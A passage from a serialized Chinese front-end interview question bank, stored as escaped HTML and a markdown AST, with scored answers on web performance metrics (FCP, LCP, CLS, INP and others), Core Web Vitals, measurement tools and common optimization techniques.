页面的时间点到FP的时间点这段时间可以被视为白屏时间，即用户看到的都是没有任何内容的白色屏幕。FP 指标反映了页面的白屏时间，白屏时间的长短直接影响了用户的体验和满意度。</li>\\n<li><strong>1：</strong> SI：全称为 Speed Index，即速度指数，用于衡量页面渲染用户可见内容迅速程度。Speed Index 并不是一个具体的时间点，而是一个综合性指标。它表示页面从加载开始到页面内容基本可见的过程中，用户感受到的加载速度。该指标是基于视频捕获的可视进度或从绘制事件的可视进展来计算。</li>\\n<li><strong>1：</strong> CLS：全称为 Cumulative Layout Shift，即累积布局偏移，用于衡量一个页面在加载过程中，由于内容的加载和渲染，导致页面布局发生多次变化的情况。具体来说，CLS 指标衡量的是页面中可见元素在加载过程中由于内容加载而发生的位置偏移。这些元素可能因为图片、广告、视频等资源的加载而发生移动。如果一个页面的元素在加载过程中频繁移动，那么这个页面的 CLS 值就会比较高，这通常不是一个好的用户体验。</li>\\n<li><strong>1：</strong> INP：全称为 Interaction to Next Paint，即交互到下一次绘制，用来衡量用户与网页交互后，浏览器完成下一次屏幕绘制所需的时间。这个指标主要关注的是用户交互（如点击、触摸、键盘输入等）之后，页面响应并渲染新内容的速度。</li>\\n<li><strong>1：</strong> FID：全称为 First Input Delay，即首次输入延迟，是衡量网页性能的一个重要指标，它反映了用户在页面加载过程中首次与页面交互时的体验。FID 特别关注用户首次点击按钮、链接、输入字段等可交互元素时，页面响应这些交互所需的时间。</li>\\n<li><strong>1：</strong> TTI：全称为 Time To Interactive，即可交互时间，用于评估页面从开始加载到用户可以顺畅地与之交互的时间点。TTI 特别关注页面的响应性和交互性，它试图捕捉用户能够开始与页面进行流畅交互的瞬间。</li>\\n</ul>\\n<h2>Core Web Vitals指的是什么？</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Core Web Vitals 是一组由Google推出的关键用户体验指标，旨在帮助开发人员评估和优化网站的性能。这些指标主要关注三个方面：加载性能、交互性能和视觉稳定性。</li>\\n</ul>\\n<blockquote>\\n<p>Core Web Vitals 包含了三个指标：INP、LCP、CLS</p>\\n</blockquote>\\n<h2>性能测量工具有哪些？</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<ul>\\n<li><strong>2：</strong> 可以借助 Gooogle 开源的 web-vitals 库来测量一些性能指标：</li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">import {onCLS, onINP, onLCP, onFCP, onFID, onTTFB} from &#39;web-vitals&#39;;\\n\\nonCLS(console.log);\\nonINP(console.log);\\nonLCP(console.log);\\nonFCP(console.log);\\nonFID(console.log);\\nonTTFB(console.log);\\n</code></pre>\\n<ul>\\n<li><p><strong>2：</strong> 使用 Google 提供免费的 PageSpeed Insights (PSI) 工具来测试网站的性能：<br><img src=\\"/public/images/PSI.png\\" alt=\\"alt text\\"></p>\\n</li>\\n<li><p><strong>2：</strong> 使用 Chrome Devtools 的 Lighthouse 选项卡测试性能指标：\\n<img src=\\"/public/images/Lighthouse.png\\" alt=\\"alt text\\"></p>\\n</li>\\n</ul>\\n<h2>如何优化前端性能？列举一些常见的性能优化策略</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（10 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 减少 HTTP 请求：合并和压缩 CSS、JavaScript 文件，使用 CSS Sprites 合并小图标，减少页面加载所需的 HTTP 请求次数。</li>\\n<li><strong>1：</strong>  使用 CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管在 CDN 上，加速资源的加载速度。</li>\\n<li><strong>1：</strong> 优化图片：使用适当的图片格式（如 WebP、JPEG 2000）和压缩图片大小，以减少页面加载时的图片大小。</li>\\n<li><strong>1：</strong> 延迟加载：对于页面中不是立即可见的内容（如图片、视频），可以采用延迟加载的方式，等到用户滚动到可见区域时再加载。</li>\\n<li><strong>1：</strong> 使用缓存：合理设置缓存策略，利用浏览器缓存和服务端缓存来减少重复请求和提高页面加载速度。</li>\\n<li><strong>1：</strong> 代码优化：避免冗余代码、优化代码结构、减少不必要的重复计算和操作，以提高代码执行效率。</li>\\n<li><strong>1：</strong> 减少重绘和重排：避免频繁的 DOM 操作、样式改变，以减少浏览器的重绘和重排，提高页面性能。</li>\\n<li><strong>1：</strong> 使用懒加载：对于长页面或内容较多的页面，可以使用懒加载技术，延迟加载部分内容，减少页面初次加载时的压力。</li>\\n<li><strong>1：</strong> 优化字体加载：避免同时加载多个字体文件，选择合适的字体格式和字体加载策略，以提高字体加载速度。</li>\\n<li><strong>1：</strong> 代码分割和按需加载：对于大型应用，可以将代码按照功能模块进行分割，按需加载，减少首屏加载时的代码量。</li>\\n</ul>\\n<h2>介绍一下浏览器渲染过程</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>5：</strong> 浏览器的渲染过程主要包括以下几个步骤：</li>\\n</ul>\\n<blockquote>\\n<p>构建 DOM 树：浏览器通过解析 HTML 文档构建 DOM（文档对象模型）树，表示页面的结构和内容。<br>构建 CSSOM 树：浏览器解析 CSS 样式表，构建 CSSOM（CSS 对象模型）树，表示页面的样式信息。<br>合并 DOM 树和 CSSOM 树：将 DOM 树和 CSSOM 树合并，生成渲染树（Render Tree），其中只包含需要显示的节点和样式信息。<br>布局（Layout）：根据渲染树计算每个节点在页面中的位置和大小，确定页面的布局。<br>绘制（Painting）：根据布局信息，将页面内容绘制到屏幕上。  </p>\\n</blockquote>\\n<h2>如何减少页面渲染时间？</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 减少 DOM 操作：避免频繁的 DOM 操作，可以一次性修改多个 DOM 节点，或者使用文档片段（DocumentFragment）来减少重排和重绘次数。  </li>\\n<li><strong>1：</strong> 优化 CSS 样式：避免使用过多复杂的 CSS 选择器，减少样式层级嵌套，以减少 CSSOM 树的构建时间。  </li>\\n<li><strong>1：</strong> 合理使用 CSS 动画：避免使用大量复杂的 CSS 动画，尽量使用 CSS3 动画代替 JavaScript 动画，以减少页面重绘次数。  </li>\\n<li><strong>1：</strong> 延迟加载资源：将不是必须立即加载的资源（如图片、脚本）延迟加载，以减少页面初次加载时的压力。  </li>\\n<li><strong>1：</strong> 使用浏览器缓存：合理设置缓存策略，利用浏览器缓存来减少资源的重复加载，提高页面加载速度。  </li>\\n<li><strong>1：</strong> 代码优化：优化 JavaScript 代码，减少不必要的计算和操作，避免长时间运行的 JavaScript 代码影响页面渲染性能。</li>\\n</ul>\\n<h2>如何进行前端代码的打包和压缩，提高页面加载速度？</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（7 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 使用构建工具：常用的前端构建工具有Webpack、Parcel、Rollup等，它们可以帮助将多个文件打包成一个或多个文件，减少网络请求次数，提高加载速度。</li>\\n<li><strong>1：</strong> 代码压缩：使用压缩工具（如UglifyJS、Terser）对 JavaScript、CSS 和 HTML 文件进行压缩，去除空格、注释、无用代码等，减小文件体积，加快加载速度。</li>\\n<li><strong>1：</strong> 图片压缩：对图片资源进行压缩处理，可以使用工具（如ImageOptim、TinyPNG）将图片压缩到合适的大小，减小文件体积，提高加载速度。</li>\\n<li><strong>1：</strong> 代码分割：按需加载代码，避免一次性加载所有代码，可以使用动态导入（dynamic import）或懒加载（lazy loading）等技术，根据需要加载不同模块，减少首次加载时间。</li>\\n<li><strong>1：</strong> 启用 Gzip 压缩：在服务器端启用 Gzip 压缩，将文件在传输过程中进行压缩，减小文件体积，加快加载速度。</li>\\n<li><strong>1：</strong> 缓存策略：合理设置缓存策略，利用浏览器缓存来减少资源重复加载，减少请求次数，提高页面加载速度。</li>\\n<li><strong>1：</strong> CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管到 CDN（内容分发网络）上，利用 CDN 的分布式节点加速文件传输，提高加载速度。</li>\\n</ul>\\n<h2>如何实现前端性能监控？</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 性能监控工具：使用性能监控工具（如Google Lighthouse、WebPageTest、GTmetrix）对网站进行性能评估，了解网站的加载速度、性能指标和问题点。</li>\\n<li><strong>1：</strong> 前端监控工具：使用前端监控工具（如Sentry、New Relic、Datadog）监控网站的前端错误、性能指标和用户行为，及时发现并解决问题。</li>\\n<li><strong>1：</strong> 性能指标：关注关键性能指标，如首次内容绘制（FCP）、可交互时间（TTI）、总体布局位移（CLS）等，优化这些指标可以提升用户体验。</li>\\n<li><strong>1：</strong> 监控用户行为：通过监控用户行为，了解用户在网站上的操作和反馈，及时优化网站性能和用户体验。</li>\\n</ul>\\n<h2>如何进行前端网络优化</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 使用CDN加速静态资源的加载，减少网络延迟。</li>\\n<li><strong>1：</strong> 启用HTTP/2协议，提高多个资源并行加载的效率。</li>\\n<li><strong>1：</strong> 使用预加载和预渲染技术，提前加载关键资源和页面，减少加载时间。</li>\\n<li><strong>1：</strong> 压缩资源（如JavaScript、CSS、图片），减小文件大小，加快下载速度。</li>\\n<li><strong>1：</strong> 使用缓存控制，利用浏览器缓存和服务端缓存，减少重复请求。</li>\\n</ul>\\n<h2>如何进行前端资源加载优化</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 延迟加载非关键资源，如图片、视频等，提高页面加载速度。</li>\\n<li><strong>1：</strong> 使用懒加载技术，按需加载页面内容，减少首次加载时间。</li>\\n<li><strong>1：</strong> 将CSS放在页面头部，JavaScript放在页面底部，避免阻塞页面渲染。</li>\\n<li><strong>1：</strong> 使用异步加载和动态导入技术，按需加载JavaScript模块，减少首次加载时间。</li>\\n</ul>\\n<h2>前端错误监控的方案</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Real User Monitoring (RUM)：除了性能数据，也可以收集用户端的错误信息，包括JavaScript错误、网络请求错误等。</li>\\n<li><strong>1：</strong> JavaScript错误监控工具：如Sentry、Bugsnag、Rollbar等，用于捕获前端JavaScript错误并提供详细的错误信息和堆栈跟踪。</li>\\n<li><strong>1：</strong> 网络请求监控：监控网络请求的成功率、响应时间等指标，及时发现接口调用失败或延迟的问题。</li>\\n<li><strong>1：</strong> 全局错误处理：在前端代码中添加全局错误处理机制，捕获未被捕获的异常，避免影响用户体验。</li>\\n</ul>\\n<h2>如何减少页面的回流和重绘？</h2>\\n<h4>类型：<code>中级</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 合并DOM操作：</p>\\n<ul>\\n<li>使用文档片段（DocumentFragment）批量插入节点</li>\\n<li>使用innerHTML一次性插入大量内容</li>\\n<li>使用display: none隐藏元素后再进行多次操作，最后再显示</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 缓存布局信息：</p>\\n<ul>\\n<li>避免在循环中多次读取offset、scroll等属性</li>\\n<li>使用变量缓存布局信息</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 使用CSS3特性：</p>\\n<ul>\\n<li>使用transform和opacity替代top、left等属性</li>\\n<li>使用will-change提示浏览器优化</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 减少复杂的选择器：</p>\\n<ul>\\n<li>避免使用过于复杂的CSS选择器</li>\\n<li>使用类选择器代替后代选择器</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 优化动画和过渡：</p>\\n<ul>\\n<li>使用requestAnimationFrame进行动画</li>\\n<li>避免在动画中使用高开销的CSS属性</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>如何优化首屏加载时间？</h2>\\n<h4>类型：<code>高级</code></h4>\\n<h4>级别：<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 资源压缩与合并：</p>\\n<ul>\\n<li>使用工具压缩JavaScript、CSS和HTML</li>\\n<li>合并多个CSS和JavaScript文件</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 使用CDN：</p>\\n<ul>\\n<li>将静态资源托管到CDN上</li>\\n<li>减少资源加载的延迟</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 图片优化：</p>\\n<ul>\\n<li>使用合适的图片格式（如WebP）</li>\\n<li>使用图片懒加载</li>\\n<li>使用CSS Sprites合并小图标</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 服务器端渲染（SSR）：</p>\\n<ul>\\n<li>使用SSR生成首屏HTML</li>\\n<li>减少客户端渲染的时间</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 减少HTTP请求：</p>\\n<ul>\\n<li>使用HTTP/2多路复用</li>\\n<li>合并请求，减少请求数量</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>如何进行JavaScript性能优化？</h2>\\n<h4>类型：<code>高级</code></h4>\\n<h4>级别：<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> 减少作用域链查找：</p>\\n<ul>\\n<li>使用局部变量缓存全局变量</li>\\n<li>避免在循环中访问全局变量</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 避免不必要的计算：</p>\\n<ul>\\n<li>使用缓存存储计算结果</li>\\n<li>使用位运算替代数学运算</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 优化循环：</p>\\n<ul>\\n<li>使用for循环代替forEach、map等</li>\\n<li>在循环中缓存数组长度</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 使用异步编程：</p>\\n<ul>\\n<li>使用Promise、async/await优化异步操作</li>\\n<li>使用Web Workers进行多线程计算</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 减少内存泄漏：</p>\\n<ul>\\n<li>使用WeakMap、WeakSet管理对象引用</li>\\n<li>清理不再使用的事件监听器</li>\\n</ul>\\n</li>\\n<li><p><strong>1：</strong> 使用现代JavaScript特性：</p>\\n<ul>\\n<li>使用ES6+特性优化代码结构</li>\\n<li>使用模块化提高代码可维护性</li>\\n</ul>\\n</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# 前端性能优化\\n\\n","depth":1,"text":"前端性能优化","tokens":[{"type":"text","raw":"前端性能优化","text":"前端性能优化","escaped":false}]},{"type":"heading","raw":"## 回流重绘\\n\\n","depth":2,"text":"回流重绘","tokens":[{"type":"text","raw":"回流重绘","text":"回流重绘","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** 回流：浏览器渲染页面之前需要对结构进行布局计算\\n- **1：** 重绘：将已经计算好布局的容器绘制出来\\n\\n- **1：** 触发回流：页面上有容器的几何属性发生变更\\n- **1：** 触发重绘：容器非几何属性变更 （字体，颜色）\\n\\n- **1：** 回流必定重绘，重绘不一定回流","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 回流：浏览器渲染页面之前需要对结构进行布局计算\\n","task":false,"loose":true,"text":"**1：** 回流：浏览器渲染页面之前需要对结构进行布局计算","tokens":[{"type":"text","raw":"**1：** 回流：浏览器渲染页面之前需要对结构进行布局计算","text":"**1：** 回流：浏览器渲染页面之前需要对结构进行布局计算","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 回流：浏览器渲染页面之前需要对结构进行布局计算","text":" 回流：浏览器渲染页面之前需要对结构进行布局计算","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 重绘：将已经计算好布局的容器绘制出来\\n\\n","task":false,"loose":true,"text":"**1：** 重绘：将已经计算好布局的容器绘制出来\\n","tokens":[{"type":"text","raw":"**1：** 重绘：将已经计算好布局的容器绘制出来\\n","text":"**1：** 重绘：将已经计算好布局的容器绘制出来","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 重绘：将已经计算好布局的容器绘制出来","text":" 重绘：将已经计算好布局的容器绘制出来","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 触发回流：页面上有容器的几何属性发生变更\\n","task":false,"loose":true,"text":"**1：** 触发回流：页面上有容器的几何属性发生变更","tokens":[{"type":"text","raw":"**1：** 触发回流：页面上有容器的几何属性发生变更","text":"**1：** 触发回流：页面上有容器的几何属性发生变更","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 触发回流：页面上有容器的几何属性发生变更","text":" 触发回流：页面上有容器的几何属性发生变更","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 触发重绘：容器非几何属性变更 （字体，颜色）\\n\\n","task":false,"loose":true,"text":"**1：** 触发重绘：容器非几何属性变更 （字体，颜色）\\n","tokens":[{"type":"text","raw":"**1：** 触发重绘：容器非几何属性变更 （字体，颜色）\\n","text":"**1：** 触发重绘：容器非几何属性变更 （字体，颜色）","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 触发重绘：容器非几何属性变更 （字体，颜色）","text":" 触发重绘：容器非几何属性变更 （字体，颜色）","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 回流必定重绘，重绘不一定回流","task":false,"loose":true,"text":"**1：** 回流必定重绘，重绘不一定回流","tokens":[{"type":"text","raw":"**1：** 回流必定重绘，重绘不一定回流","text":"**1：** 回流必定重绘，重绘不一定回流","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 回流必定重绘，重绘不一定回流","text":" 回流必定重绘，重绘不一定回流","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 前端性能指标有哪些？\\n\\n","depth":2,"text":"前端性能指标有哪些？","tokens":[{"type":"text","raw":"前端性能指标有哪些？","text":"前端性能指标有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（11 分）\\n\\n","depth":4,"text":"解答（11 分）","tokens":[{"type":"text","raw":"解答（11 分）","text":"解答（11 分）","escaped":false}]},{"type":"list","raw":"- **1：** FCP：全称为 First Contentful Paint，即首次内容绘制，表示页面绘制其第一个非白色元素（如文本、图像、非空白 canvas 或 SVG）所需的时间。\\n- **1：** LCP：全称为 Largest Contentful Paint，即最大内容绘制，用于记录视窗内最大的元素绘制的时间，这个时间会随着页面渲染变化而变化，因为页面中的最大元素在渲染过程中可能会发生改变，该指标会在用户第一次交互后停止记录。\\n- **1：** TTFB：全称为 Time to First Byte，即首字节时间，表示从点击网页到接收到第一个字节的时间。\\n- **1：** TBT：全称为 Total Blocking Time，即总阻塞时间，用于衡量的是长任务对主线程的阻塞时间总和。即从首次内容绘制（FCP）到页面达到可交互时间（TTI）期间，主线程因运行长任务而被阻塞的总时间，因此，TBT 会对首次输入延迟有很大影响。长任务是指那些执行时间超过 50 毫秒的 JavaScript 任务，因为它们可能会阻塞页面的渲染和响应，从而影响用户体验。\\n- **1：** FMP：全称为 First Meaningful Paint，即首次有效渲染。它衡量的是从用户开始加载页面到浏览器首次渲染出对用户来说有意义的内容（如文本、图片、按钮等可交互元素）所花费的时间。\\n- **1：** FP：全称为 First Paint，即首次绘制，表示浏览器首次将像素渲染到屏幕上的时间点。在性能统计指标中，从用户开始访问 Web 页面的时间点到FP的时间点这段时间可以被视为白屏时间，即用户看到的都是没有任何内容的白色屏幕。FP 指标反映了页面的白屏时间，白屏时间的长短直接影响了用户的体验和满意度。\\n- **1：** SI：全称为 Speed Index，即速度指数，用于衡量页面渲染用户可见内容迅速程度。Speed Index 并不是一个具体的时间点，而是一个综合性指标。它表示页面从加载开始到页面内容基本可见的过程中，用户感受到的加载速度。该指标是基于视频捕获的可视进度或从绘制事件的可视进展来计算。\\n- **1：** CLS：全称为 Cumulative Layout Shift，即累积布局偏移，用于衡量一个页面在加载过程中，由于内容的加载和渲染，导致页面布局发生多次变化的情况。具体来说，CLS 指标衡量的是页面中可见元素在加载过程中由于内容加载而发生的位置偏移。这些元素可能因为图片、广告、视频等资源的加载而发生移动。如果一个页面的元素在加载过程中频繁移动，那么这个页面的 CLS 值就会比较高，这通常不是一个好的用户体验。\\n- **1：** INP：全称为 Interaction to Next Paint，即交互到下一次绘制，用来衡量用户与网页交互后，浏览器完成下一次屏幕绘制所需的时间。这个指标主要关注的是用户交互（如点击、触摸、键盘输入等）之后，页面响应并渲染新内容的速度。\\n- **1：** FID：全称为 First Input Delay，即首次输入延迟，是衡量网页性能的一个重要指标，它反映了用户在页面加载过程中首次与页面交互时的体验。FID 特别关注用户首次点击按钮、链接、输入字段等可交互元素时，页面响应这些交互所需的时间。\\n- **1：** TTI：全称为 Time To Interactive，即可交互时间，用于评估页面从开始加载到用户可以顺畅地与之交互的时间点。TTI 特别关注页面的响应性和交互性，它试图捕捉用户能够开始与页面进行流畅交互的瞬间。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** FCP：全称为 First Contentful Paint，即首次内容绘制，表示页面绘制其第一个非白色元素（如文本、图像、非空白 canvas 或 SVG）所需的时间。\\n","task":false,"loose":false,"text":"**1：** FCP：全称为 First Contentful Paint，即首次内容绘制，表示页面绘制其第一个非白色元素（如文本、图像、非空白 canvas 或 SVG）所需的时间。","tokens":[{"type":"text","raw":"**1：** FCP：全称为 First Contentful Paint，即首次内容绘制，表示页面绘制其第一个非白色元素（如文本、图像、非空白 canvas 或 SVG）所需的时间。","text":"**1：** FCP：全称为 First Contentful Paint，即首次内容绘制，表示页面绘制其第一个非白色元素（如文本、图像、非空白 canvas 或 SVG）所需的时间。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" FCP：全称为 First Contentful Paint，即首次内容绘制，表示页面绘制其第一个非白色元素（如文本、图像、非空白 canvas 或 SVG）所需的时间。","text":" FCP：全称为 First Contentful Paint，即首次内容绘制，表示页面绘制其第一个非白色元素（如文本、图像、非空白 canvas 或 SVG）所需的时间。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** LCP：全称为 Largest Contentful Paint，即最大内容绘制，用于记录视窗内最大的元素绘制的时间，这个时间会随着页面渲染变化而变化，因为页面中的最大元素在渲染过程中可能会发生改变，该指标会在用户第一次交互后停止记录。\\n","task":false,"loose":false,"text":"**1：** LCP：全称为 Largest Contentful Paint，即最大内容绘制，用于记录视窗内最大的元素绘制的时间，这个时间会随着页面渲染变化而变化，因为页面中的最大元素在渲染过程中可能会发生改变，该指标会在用户第一次交互后停止记录。","tokens":[{"type":"text","raw":"**1：** LCP：全称为 Largest Contentful Paint，即最大内容绘制，用于记录视窗内最大的元素绘制的时间，这个时间会随着页面渲染变化而变化，因为页面中的最大元素在渲染过程中可能会发生改变，该指标会在用户第一次交互后停止记录。","text":"**1：** LCP：全称为 Largest Contentful Paint，即最大内容绘制，用于记录视窗内最大的元素绘制的时间，这个时间会随着页面渲染变化而变化，因为页面中的最大元素在渲染过程中可能会发生改变，该指标会在用户第一次交互后停止记录。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" LCP：全称为 Largest Contentful Paint，即最大内容绘制，用于记录视窗内最大的元素绘制的时间，这个时间会随着页面渲染变化而变化，因为页面中的最大元素在渲染过程中可能会发生改变，该指标会在用户第一次交互后停止记录。","text":" LCP：全称为 Largest Contentful Paint，即最大内容绘制，用于记录视窗内最大的元素绘制的时间，这个时间会随着页面渲染变化而变化，因为页面中的最大元素在渲染过程中可能会发生改变，该指标会在用户第一次交互后停止记录。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** TTFB：全称为 Time to First Byte，即首字节时间，表示从点击网页到接收到第一个字节的时间。\\n","task":false,"loose":false,"text":"**1：** TTFB：全称为 Time to First Byte，即首字节时间，表示从点击网页到接收到第一个字节的时间。","tokens":[{"type":"text","raw":"**1：** TTFB：全称为 Time to First Byte，即首字节时间，表示从点击网页到接收到第一个字节的时间。","text":"**1：** TTFB：全称为 Time to First Byte，即首字节时间，表示从点击网页到接收到第一个字节的时间。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" TTFB：全称为 Time to First Byte，即首字节时间，表示从点击网页到接收到第一个字节的时间。","text":" TTFB：全称为 Time to First Byte，即首字节时间，表示从点击网页到接收到第一个字节的时间。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** TBT：全称为 Total Blocking Time，即总阻塞时间，用于衡量的是长任务对主线程的阻塞时间总和。即从首次内容绘制（FCP）到页面达到可交互时间（TTI）期间，主线程因运行长任务而被阻塞的总时间，因此，TBT 会对首次输入延迟有很大影响。长任务是指那些执行时间超过 50 毫秒的 JavaScript 任务，因为它们可能会阻塞页面的渲染和响应，从而影响用户体验。\\n","task":false,"loose":false,"text":"**1：** TBT：全称为 Total Blocking Time，即总阻塞时间，用于衡量的是长任务对主线程的阻塞时间总和。即从首次内容绘制（FCP）到页面达到可交互时间（TTI）期间，主线程因运行长任务而被阻塞的总时间，因此，TBT 会对首次输入延迟有很大影响。长任务是指那些执行时间超过 50 毫秒的 JavaScript 任务，因为它们可能会阻塞页面的渲染和响应，从而影响用户体验。","tokens":[{"type":"text","raw":"**1：** TBT：全称为 Total Blocking Time，即总阻塞时间，用于衡量的是长任务对主线程的阻塞时间总和。即从首次内容绘制（FCP）到页面达到可交互时间（TTI）期间，主线程因运行长任务而被阻塞的总时间，因此，TBT 会对首次输入延迟有很大影响。长任务是指那些执行时间超过 50 毫秒的 JavaScript 任务，因为它们可能会阻塞页面的渲染和响应，从而影响用户体验。","text":"**1：** TBT：全称为 Total Blocking Time，即总阻塞时间，用于衡量的是长任务对主线程的阻塞时间总和。即从首次内容绘制（FCP）到页面达到可交互时间（TTI）期间，主线程因运行长任务而被阻塞的总时间，因此，TBT 会对首次输入延迟有很大影响。长任务是指那些执行时间超过 50 毫秒的 JavaScript 任务，因为它们可能会阻塞页面的渲染和响应，从而影响用户体验。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" TBT：全称为 Total Blocking 